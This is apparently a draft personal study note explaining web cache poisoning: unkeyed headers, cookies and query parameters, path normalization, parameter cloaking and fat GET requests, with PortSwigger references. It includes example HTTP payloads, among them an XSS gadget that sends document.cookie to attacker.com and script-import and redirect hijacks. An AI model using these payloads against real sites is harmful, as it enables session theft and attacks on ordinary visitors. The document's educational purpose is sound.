---
created: 2026-05-20
tags:
  - web_hacking
  - intermediaries
status: draft
---
- To be completed from saved notes
## Web Cache Poisoning

>**Web Cache Poisoning (WCP)** is vulnerability that allows an attacker to trick a web cache into storing a corrupted or poisoned HTTP response by exploiting discrepancies between how a cache server constructs *cache keys* and how a backend server generates responses. The poisoned response is subsequently  served to legitimate users whose requests match the same cache key.

- The attack consists of two main phases: 
	- Discovering a vulnerability in the target application that can be triggered via a user-controlled parameter which is **not included in the cache key** by the cache server. Such vulnerability is called a **gadget**.
	- Get the response stored by the cache server under a generic cache key. 

- The cache server stores the poisoned response and serves it to any requests matching the same cache key. Since the payload was not included in the cache key, the attack doesn't require any further interaction from you: the exploit is delivered to requests without the payload.

>[!note] To learn more about web caches and how they work, see [[Web caches]].

### Potential impact

- The potential impact of a web cache poisoning vulnerability depends on two key factors:
	- The gadget you find and what it can be exploited for (e.g., XSS or open redirect).
	- How often the poisoned response is requested (or how often other users make requests matching the cache key of your payload request).

>[!quote] Note that the duration of a cache entry doesn't necessarily affect the impact of web cache poisoning. An attack can usually be scripted in such a way that it re-poisons the cache indefinitely.
>Source: [`Web cache poisoning — PortSwigger Web Security Academy`](https://portswigger.net/web-security/web-cache-poisoning).

- A successful WCP attack can lead to the spread of secondary attacks such as:
	- **Stored [[XSS]]** — A reflected XSS gadget becomes stored in the cache and executes in every victim's session without any victim interaction or malicious URL required.
	- **Content defacement** —  Manipulating content on trusted websites to spread misinformation.
	- **Script/resource import hijacking**
	- **DOM-based exploitation**
	- **DoS (Denial of Service)**
	- **HTTP request smuggling**
	- **CRLF injection**

>[!note]+ WCP vs. WCD
>- **WCP (Web Cache Deception)** is the inverse of WCP: it tricks the cache into storing private, user-specific content under a public cache key, so you can retrieve that data later. This is mostly information disclosure — *reading* from the cache. See [[Web Cache Deception]].
>- WCP injects your content into a shared cache to be served to victims — writing to the cache. 

## How web cache poisoning works 

- The main reason of web cache poisoning vulnerabilities is the **mismatch** between **which user-controlled input entries affect server response** and **which are included in the cache key**. 

---
- So, you can use one parameter to inject your payload that gets reflected in the server response, such that the parameter is completely ignored by the cache. 
- Users then send requests without the parameter with the payload you used. The cache sees your and those requests identical -> users receive the cached poisoned response. 

>[!important] Web cache poisoning vulnerabilities occur when the backend server generates responses based on **user-controlled input entries** (e.g., HTTP headers, cookies, query parameters, etc.) **that are not included in the cache key** used by the cache server. Such inputs are called **unkeyed inputs**.

> **Unkeyed input** — any user-controllable component of an HTTP request (header, cookie, query parameter, body) that influences the backend server's response generation but is _excluded_ from the cache key computation.

>[!important] **Everything that is not part of the cache key is part of the WCP attack surface.**

- How web cache poisoning works step-by-step:
	1. The backend server generates responses based on user-controlled input entries, such as query parameters, `POST` parameters, HTTP headers (e.g., `X-Forwarded-Host`, `User-Agent`, etc.), etc.
	2. The **cache key** used by the caching servers (CDNs, reverse proxies), is calculated **without taking into account certain user-controlled inputs that influence response generation**. In other words, the application exposes user-controlled inputs **unkeyed** by the cache server.
	3. If the value of an unkeyed input is **reflected** in the response from the backend, the attacker can send a request to malicious payload in unkeyed inputs (e.g., injecting XSS in the `X-Forwarded-Host` header) so that the response is **stored in the cache and served to other users** under a **generic cache key** (to requests without the unkeyed input included).
	4. If the unkeyed input is vulnerable, say, to XSS, the attacker can **spread the attack** by making the cache server store the poisoned response. Any user who happens to use the same public cache are likely to be affected by the attack.

>[!important] The attack doesn't require any user interaction.

>[!example]-
> - Suppose you find a reflected XSS in the `X-Forwarded-Host` header:
> 
> ```http
> GET /index.html HTTP/1.1
> Host: example.com
> X-Forwarded-Host: a."><script>alert('Poisoned!')</script>
> ```
> 
> ```html
> <meta property="og:image" content="https://a."><script>alert('Poisoned')</script>"/>
> ```
> 
> - Without a CRLF injection, however, you can't really construct a URL that, on visiting, makes the victim browser set the header. The only realistic way to deliver the payload in this case is web cache poisoning.
> ---
> - If `X-Forwarded-Host` is **not included in the cache key** used by an intermediary cache server, then the poisoned response will be stored under a generic cache key. 
> - In other words, users who send requests to `index.html` — even without the `X-Forwarded-Host` header — will hit the response you cached.
> 
> ---
> - This example is taken from [`Practical Web Cache Poisoning — James Kettle, PortSwigger Research`](https://portswigger.net/research/practical-web-cache-poisoning).

>[!important]+ Preconditions for web cache poisoning
> - The presence of a **public cache** between the clients and the origin (CDN, reverse proxy, shared cache).
> - At least one endpoint is **cacheable**. 
> - The backend response varies based on **user-controlled input**.
> - The **cache key does not include at least one ot those inputs** (presence of an *unkeyed input*).
> - The unkeyed input's value is reflected or otherwise processed by the server in a way that can be weaponized (XSS, redirect, script import, etc.).
> - It is possible to determine whether a given response came from the cache or origin (cache oracle).
## Web Cache Poisoning testing methodology

The general methodology for identifying web cache poisoning vulnerabilities can be described as follows:

1. **Select a cache oracle** on the target site.
2. **Probe for transformations** in cache key construction by sending pairs of similar requests and observing cache behavior.
    - Examples: Removing query parameters, altering the Host header port, URL encoding/decoding.
3. **Detect cache key gaps** where different requests are treated as identical by the cache, but not by the backend.

---

4. Find a cache oracle
5. Identify unkeyed inputs 
6. Discover an exploitable gadget 
7. Get the response cached 

### 1. Analyze caching infrastructure

![[Web Cache Deception#Cache oracles]]
![[Web Cache Deception#Explicit cache-state headers]]
![[Web Cache Deception#The Age header as an oracle]]
![[Web Cache Deception#Response time analysis]]
![[Web Cache Deception#The Vary header]]
![[Web Cache Deception#Fingerprinting the caching layer]]

>[!tip] Use **cache busters** to avoid hitting cached responses
>- **Cache busters** are random query parameters, e.g., `?buster=random123` used to force a cache server to treat each request as unique. This is done to avoid hitting cached resources.
>- Tools like Param Miner (Burp Suite extension) automatically add dynamic cache buster (if you configure it to do so) to every request you make during testing to avoid cached resources.
### 2. Identify unkeyed inputs

- An unkeyed input is any component of an HTTP request that:
	- You can control
	- Influences the server response
	- Is not included in the cache key by the cache server

- Two main methods to identify unkeyed inputs:
	- Manually
	- Using Param Miner (available in Burp Community Edition)
#### Automatic discovery with Param Miner

>[Param Miner](https://github.com/PortSwigger/param-miner) is a free, open-source Burp Suite extension developed by PortSwigger that automates the discovery of hidden, unlinked, or undocumented parameters in web applications and APIs.

- Param Miner works systematically injects thousands of parameter names — using a curated wordlist and harvested data — into HTTP requests and uses **differential response analysis** to detect changes in server behavior. 
- It can also be used to discover **unkeyed inputs**. 

>[!note]+ Installation
>Go to `Extensions` -> `BApp Store` -> Search `Param Miner` -> Install.

1. In `HTTP history` or Repeater, right-click the request you want to test.
2. Select `Extensions` -> `Param Miner`.
3. Choose the scan option:

| Option               | Description                        |
| -------------------- | ---------------------------------- |
| `Guess headers`      | Test HTTP request headers.         |
| `Guess query params` | Test URL query parameters.         |
| `Guess cookies`      | Test cookie names.                 |
| `Guess body params`  | Test `POST`/`PUT` body parameters. |
| `Guess everything!`  | Run all of the above.              |

![[images/walkthrough/PortSwigger/Web Cache Poisoning/lab1/3.png]]

- Alternatively, go to `Target` -> `Site map`, right-click the site you want to test -> `Extensions` -> `Param Miner`.

>[!tip]+ By default, Param Miner uses a curated wordlist with over 50,000 common parameter names (continuously updated) + words harvested from in-scope traffic as you run the extension. You can specify your own wordlist as well. 

>[!tip] Param Miner is able to detect even slightest changes in server responses to detect how user input affects server responses. 

- To see the output, go to `Extensions` -> `Installed` -> `Param Miner` > `Output` tab:

![[images/walkthrough/PortSwigger/Web Cache Poisoning/lab1/4.png]]


- The interesting line in the logs in this example is this:

```
Identified parameter on 0a3d009f043e171180cf764b0013003a.web-security-academy.net: x-forwarded-host~%s.%
```

- Here, Param Miner identified an HTTP header that affects the server's response but is not included in a cache key:
	- `x-forwarded-host` is the header name.
	- `~%s.%` means that Param Miner inserted a unique, random value (represented by `%s`) followed by a dot (`.`) as the header value during its tests.

- So, if `%s` was replaced with `test123`, the actual header sent would be:

```HTTP
X-Forwarded-Host: test123.
```

>[!note] The presence of `~%s.%` in the output means Param Miner found that **injecting a value into this header caused a detectable change in the response**, suggesting it is an unkeyed input or otherwise influences the application.

You can then check that the header is indeed an unkeyed input and exploit it manually.

In summary:
- **Probe systematically** by altering one input at a time.
- **Confirm cache hit/miss patterns** to identify keyed or unkeyed components.
- **Test for reflection of unkeyed inputs** in cached content to find poisoning vectors.
- **Leverage vendor-specific headers** where possible to explicitly view cache keys.
- **Consider normalization and encoding effects** that impact cache key construction.

### 3. Identify gadgets and deliver an exploit

>A **gadget** is a **reflected, client-side vulnerability** on the target application — such as **reflected XSS** or an **open redirect** — that, when supplied with attacker-controlled input through an unkeyed channel, produces a harmful output (script execution, content defacement, redirection, etc.).

- Gadgets are often client-side vulnerabilities that are classified as low-risk or "unexploitable" in isolation — often because you can't deliver them to victims using a cross-site link (e.g., an XSS in an HTTP header).
- Web Cache Poisoning acts as a delivery mechanism that requires zero interactions from the victims beyond normal page visit — the payload is cached and served from the legitimate URL. 
---
Common gadget examples:

- **Reflected XSS** ([[XSS#Reflected XSS]])
	- Reflected XSS In an HTTP header or query parameter which WCP delivers to victims and turns into **stored XSS** ([[XSS#Stored XSS]]).

>[!example]-
>- Request:
> ```http
> GET /en?region=uk&cb=xp8k2f HTTP/1.1
> Host: example.com
> X-Forwarded-Host: attacker.com"><script>fetch('https://attacker.com/?c='+document.cookie)</script>
> ```
> - Response:
> ```html
> <meta property="og:image" content="https://attacker.com"><script>fetch('https://attacker.com/?c='+document.cookie)</script>/img/social.png" />
> ```

- **Script/resource import hijacking**
	- The backend dynamically constructs a script `src` URL using an unkeyed header value. An attacker who controls that domain can serve arbitrary JavaScript.

>[!example]-
> - Request: 
> 
> ```http
> GET / HTTP/1.1
> Host: example.com
> X-Forwarded-Host: attacker.com
> ```
> 
> - Response:
> 
> ```html
> <script src="https://attacker.com/static/analytics.js"></script>
> ```

- **Open redirect from trusted origin**
	- An unkeyed header influences a `Location` header in a redirect response. 
	- The redirect comes from a legitimate domain and therefore bypasses the same-origin restrictions.

>[!example]-
> - Request:
> 
> ```http
> GET / HTTP/1.1
> Host: example.com
> X-Forwarded-Host: attacker.com
> X-Forwarded-Proto: http
> ```
> 
> - Response:
> 
> ```http
> HTTP/1.1 301 Moved Permanently
> Location: https://attacker.com/
> ```

## Cache design vs. implementation flaws

Cache vulnerabilities that can be exploited with web cache poisoning can be divided into two main groups:

- Cache design flaws
	- Conceptual weaknesses in how cache keys are constructed relative to backend responses.
- Cache implementation flaws
	- Software bugs or inconsistencies in how cache servers process, normalize, or transform inputs during cache key creation or request handling.

>[!example]
>Suppose a website uses the `X-Forwarded-Host` header to generate URLs in the response in the `<meta>` tags.
>
> - **Design flaw**
> 	- The cache key **does not include** the `X-Forwarded-Host` header at all.
> 	- Hence, requests with different `X-Forwarded-Host` values are treated as **identical** by the cache, even through the backend response depends on this header.
> ---
> - **Implementation flaw**
> 	- The cache key **does include** the `X-Forwarded-Host` header but **normalizes** or **transforms** its value — for example, by lowercasing or stripping a port number.
> 	- Meanwhile, the backend treats the header literally, such as respect letter case or retains the port number in the response.
> 	- This mismatch between how the cache key is processed and the backend response creates a subtle bug which can be exploited for cache poisoning.

## Cache design flaws

>**Cache design flaws** occur when the cache key is defined that such that it excludes user-controlled request components that cause meaningful variation in the backend response.

- Cache design flaws are canonical web cache poisoning bugs. They are easier to detect and exploit. 

>[!note] **Design flaws** = architectural issues where the cache key *excludes* inputs that influence the response.

### Unkeyed HTTP headers

- **`X-Forwarded-Host`**
	- Originally used by reverse proxies to pass the client's original `Host` to the origin servers.
	- Many applications use this header — when present — to construct absolute URLs, such as for canonical links, redirects, scripts imports, open-graph (`og`) tags, etc (see [[🛠️ Host header injection]]).
	- At the same time, many CDNs and caches do not include it in the cache key.

	```http
	GET / HTTP/1.1
	Host: example.com
	X-Forwarded-Host: attacker.com
	```
	```html
	<link rel="canonical" href="https://attacker.com/en/page"/>
	```
	```html
	<meta property="og:url" content="https://attacker.com/en/page"/>
	```
	```html
	<script src="https://attacker.com/static/app.js"></script>
	```

- **`X-Forwarded-Scheme` / `X-Forwarded-Proto`**
	- Applications sometimes enforce HTTPS by checking the `X-Forwarded-Proto` header. If it's set to `http`, the application generates an `https://` redirect.

	```http
	GET / HTTP/1.1
	Host: example.com
	X-Forwarded-Proto: http
	X-Forwarded-Host: attacker.com
	```
	
	```http
	HTTP/1.1 301 Moved Permanently
	Location: https://attacker.com/
	```

>[!note] Without `X-Forwarded-Host`, the `X-Forwarded-Proto` alone just redirects to the target's own HTTPS version. This example above demonstrates **chaining multiple unkeyed headers** to produce an exploit that neither header enables alone.

- Once Param Miner identified any of these inputs unkeyed, identify where exactly the value is reflected in response. 
### Unkeyed URL query parameters

- Some caches intentionally exclude analytics/tracking parameters from cache keys to improve hit ratios. For example, [UTM parameters](https://en.wikipedia.org/wiki/UTM_parameters) are user-specific advertising metadata that, if keyed, would reduce cache effectiveness significantly. 
	
	- `utm_source`, `utm_medium`, `utm_campaign`, `utm_content`, `utm_term` (UTM parameters).
	- `fbclid` (Facebook click ID).
	- `gclid` (Google click ID).
	- `ref`, `affiliate_id`, `campaign`.

- The vulnerability occurs when the backend still processes these parameters and maybe reflects them in the response. 

[!example]

> [!important] Cache busters when the query string is fully unkeyed
> 
> - If the cache excludes _all_ query parameters (which is rare, though), `?cb=1` has no effect as a cache buster. The cache ignores the parameter, so all query variations hit the same entry. 
> - In this case, switch to HTTP request headers that are included in the cache key but do not affect backend response:
> 
> - `Accept-Encoding`
> 
> ```HTTP
> Accept-Encoding: gzip, deflate, cachebuster
> ```
> 
> - `Accept`
> 
> ```HTTP
> Accept: */*, text/cachebuster
> ```
> 
> - `Cookie`
> 
> ```HTTP
> Cookie: cachebuster=1
> ```
> 
> - `Origin`
> 
> ```HTTP
> Origin: https://cachebuster.example.com
> ```
> 
### Unkeyed cookies

- Cookies are frequently excluded from cache keys because they are user-specific, similar to tracking parameters. 
- A cookie like `lang=en` or `currency=GBP` drives page content but is excluded from the key.

>[!example]+ 
> - If the backend reflects cookie values without validation:
> ```HTTP
> GET / HTTP/1.1
> Host: example.com
> Cookie: lang=<script>alert(1)</script>
> ```
> 
> - Response:
> 
> ```HTML
> <p>Language: <script>alert(1)</script></p>
> ```

>[!note] Without WCP, XSS in HTTP headers or cookies is nearly unexploitable. There's no trivial way to inject arbitrary cookies values into another user's browser through a cross-site link — unlike query parameters, which you can embed in a URL. 

### Unkeyed fat `GET` request body

- HTTP/1.1 does not prohibit `GET` requests from having a body (commonly called a *fat `GET`*). 
- Most servers ignore or reject bodies on `GET` requests — but some backend frameworks, particularly those that reuse request-parsing code across methods, accept and process them.
- Caches virtually never include the request body in the cache key. This is how fat `GET`s become an attack vector for WCP.

>[!example]+ Example: Fat `GET` requests
> - Fat `GET` request:
> 
> ```HTTP
> GET /search?q=test HTTP/1.1
> Host: example.com
> Content-Type: application/x-www-form-urlencoded
> 
> q=<script>alert(1)</script>
> ```
> 
> - Response:
> 
> ```HTML
> <p>Search results for: <script>alert(1)</script></p>
> ```

>[!note] Similar to XSS in HTTP headers or cookies, XSS in request bodies is almost unexploitable without WCP.
## Cache implementation flaws

>**Cache implementation flaws** occur from inconsistent processing, normalization, or transformation of request components between the cache server and the backend server. The effective cache key differs from the full data passed to application code, which creates exploitable discrepancies.

- Implementation flaws are more subtle than design flaws; the cache *does* include the vulnerable component in the key — but it transforms or partially processes the value before storing. That transformation creates a gap.

- Common implementation issues include:
	- Lowercasing parameters.
	- Stripping/altering a port number in the `Host` header.
	- URL-encoding discrepancies.
	- Path normalization: handling of dot-dot-slash `../`, trailing slashes, etc.
### Unkeyed port number in `Host` header

- The `Host` header itself is included in the key by virtually every cache. 
- However, many implementations **strip the port number** when constructing the cache key, but still pass the full header value, including the port number, to the backend. 
- At the same time, the backend reflects the port in its response (such as when constructing absolute URLs). 

>[!example]+
> 1. Confirm the backend reflects the port number in the response. 
> 
> 	```http
> 	GET / HTTP/1.1
> 	Host: example.com:1337
> 	```
> 	
> 	```http
> 	HTTP/1.1 302 Moved Permanently
> 	Location: https://example.com:1337/en
> 	X-Cache: miss
> 	```
> 	
> 	- The backend included `:1337` in the redirect URL.
> 
> 2. Confirm the cache treats the port as unkeyed; send a request without the port.
> 
> 
> 	```http
> 	GET / HTTP/1.1
> 	Host: example.com
> 	```
> 	
> 	```http
> 	HTTP/1.1 302 Moved Permanently
> 	Location: https://example.com:1337/en
> 	X-Cache: hit
> 	```

### Unkeyed query string

- Some cache implementations exclude the **entire query string** from the cache key.
- This means reflected XSS in *any* query parameter silently transforms into stored XSS via cache poisoning.
- A cache buster, in this case, can be a keyed cookie or HTTP header. 

```http
Accept-Encoding: gzip, deflate, cachebuster
```
```http
Accept: */*, text/cachebuster**
```
```http
Cookie: cachebuster=1
```
```http
Origin: https://cachebuster.example.com
```
### Path normalization discrepancies

- The request path is essentially always part of the cache key. However, the cache and backend may normalize the path differently.
- If the cache server normalizes URL path before including it in the cache key but the backend server receives the raw, unprocessed path and reflects it, this creates potentially exploitable discrepancies  

>[!note]+ Common sources of normalization discrepancies
> - Multiple slashes: `/path//page` vs. `/path/page` .
> - URL-encoded segments: `/path/%2Fpage` vs. `/path//page`.
> - Special characters, escape sequences (e.g., `%0A%0D`, `%00`).
> - Dot-dot segments: `/../arbitrary/`, `/..%2Farbitrary`.

You can also encounter certain framework-specific quirks that can be exploited. For example, all these paths are treated as `/` by different servers and frameworks:

- Apache: `//`
- Nginx: `/%2F`
- PHP: `/index.php/arbitrary`
- .NET: `/(A(arbitrary)/`

### Parameter cloaking

- Normally, the full query string is included in the cache key. However, many caches exclude certain query parameters form the key to optimize caching (such as tracking parameters like `utm_source`, `utm_content`, etc mentioned before).
- If there's a parsing discrepancy between how the cache server and the backend application parse the query string, the servers may disagree on where the parameters begin and end. You may be able to inject new URL parameters that will go unnoticed by the cache but seen my the backend. This attack is called **parameter cloaking** or **parameter closing**.

>[!example]+
> - Suppose the cache excludes a parameter like `utm_content` from the cache key.
> - The cache treats **any `?`** as starting a new parameter (a common native implementation). 
> - The backend (application) only recognizes the **first `?`** as the query string part. 
> 
> You send a request like this:
> 
> ```
> GET /?q=123?utm_content=bad-stuff-here
> ```
> 
> - The cache sees two parameters → `q=123` (keyed) and `utm_content=bad-stuff-here` (excluded from key). Cache key is based on the clean `/` + `example=123`.
> - The backend sees only one parameter: `q=123?utm_content=bad-stuff-here` (the second `?` is treated as literal data in the value).
> 
> 	If the value of the `q` parameter is passed into a useful gadget, you can inject a payload without affecting the cache key. 
> 

- A similar issue can arise in the opposite scenario, where the backend identifies multiple distinct parameters while the cache doesn't.

>[!example]+
> - The Ruby on Rails framework, for example, interprets both ampersands (`&`) and semicolons (`;`) as delimiters.
> 
> You send a request like this:
> 
> ```
> GET /?q=123&utm_content=test;q=bad-stuff-here
> ```
> 
> - `q` is included in the cache key, but `utm_content` is not. The cache sees only two parameters (delimited by the ampersand `&`):
> 	1. `q=123`
> 	2. `utm_content=test;q=bad-stuff-here`
> - On the other hand, Ruby on Rails sees the semicolon and splits the query string into three separate parameters:
> 	1. `q=123`
> 	2. `utm_content=test`
> 	3. `q=bad-stuff-here`
> - Now there is a duplicate `q`.
> - If there are duplicate parameters, each with different values, Ruby on Rails gives precedence to the final occurrence.
> - As a result, **the cache key contains an expected parameter value** and serves the response normally to other users. The backend, however, has a completely different value of the same parameter. It is this second value that will be passed into the gadget and reflected in the poisoned response.

>[!bug]+ Labs
>- [[🛠️ Web Cache Poisoning labs#7. Parameter cloaking]]

### Fat `GET`

- The HTTP/1.1 specification doesn't prohibit HTTP `GET` requests from having a body. Such requests are commonly called **fat `GET` requests**.

>A **fat `GET` request** is a non-standard HTTP `GET` request with a **body** (payload).

- Most servers ignore or reject bodies in `GET` requests. However, some backend frameworks accepts and process them. 
- At the same time, cache servers virtually never include request bodies in the cache key.
- This creates a discrepancy that may be exploited for web cache poisoning. 

>[!example]+
> ```http
> GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
> Host: target.com
> Content-Type: application/x-www-form-urlencoded
> 
> callback=alert(document.domain)
> ```

>[!bug]+ Labs 
>- [[🛠️ Web Cache Poisoning labs#8. Web cache poisoning via a fat GET request]]

## References

- [`Practical Web Cache Poisoning — James Kettle, PortSwiggier Research (2018)`](https://portswigger.net/research/practical-web-cache-poisoning)
- [`Web Cache Entanglement: Novel Pathways to Poisoning — James Kettle, PortSwigger Research (2020)`](https://portswigger.net/research/web-cache-entanglement)

- [`HTTP/2: The Sequel is Always Worse — James Kettle, PortSwigger Research (2021)`](https://portswigger.net/research/http2)

- [`Web cache poisoning — PortSwigger Web Security Academy`](https://portswigger.net/web-security/web-cache-poisoning)
- [`Exploiting cache design flaws — PortSwigger Web Security Academy`](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws)
- [`Exploiting cache implementation flaws — PortSwigger Web Security Academy`](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws)

- [`Cache Poisoning — OWASP`](https://owasp.org/www-community/attacks/Cache_Poisoning)


- https://poison.digi.ninja/

- https://hackxor.net/mission?id=8 — from James!
